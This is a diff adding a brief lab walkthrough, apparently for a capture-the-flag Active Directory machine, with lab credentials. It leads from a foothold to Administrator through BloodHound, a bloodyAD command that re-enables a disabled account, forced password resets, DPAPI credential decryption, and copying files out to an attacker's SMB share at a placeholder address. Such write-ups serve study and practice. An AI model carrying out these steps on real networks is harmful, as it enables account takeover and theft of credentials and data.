@@ -1,0 +1,14 @@
+Initial credentials have been given: levi.james:KingofAkron2025!
+Using those credentials, obtained Bloodhound-ingestable data using `bloodhound-python`
+Then from bloodhound, followed the steps to get ant.edwards user
+Then from bloodhound, noticed that ant.edwards user can change the password of adam.silver but after changing, cannot access it due to adam's account being disabled.
+Resetting the machine did not help, so found this command with bloodyAD to re-enable it:
+`bloodyAD -u <USERNAME-YOU-CONTROL> -p <PASSWORD> --host 10.129.196.197 remove uac <DISABLED-ACCOUNT> -f ACCOUNTDISABLE`
+After re-enabling adam's account, can winrm into it, once inside, checked adam's own home folder, found the user.txt but no other useful info.
+Went to C:\, and found some storage folder, went in explored a bit, found nothing, went back to C:\
+Started to go from first folder and explore one by one. In the first folder, there's a site backup zip file. Exfiltrated it via SMB (setup impacket-smbserver in kali and used `copy FILE \\KALI-IP\share`)
+Unzipped, found password for steph, bloodhound didn't show anything, so ran winpeas on steph's winrm session, winpeas showed something about DPAPI credential and master key files.
+Exfiltrated the masterkey and cred files to kali machine and then used impacket-dpapi to decrypt masterkey first, then use the decyrpted key to decrypt the cred files.
+One of the cred files have the steph.cooper_adm cred and then used that credential to winrm but inside steph.cooper_adm, there's nothing.
+So went back to bloodhound and they say steph.cooper_adm can force change Administrator's password.
+once changed administrator's password, can winrm into administrator and then get root.txt
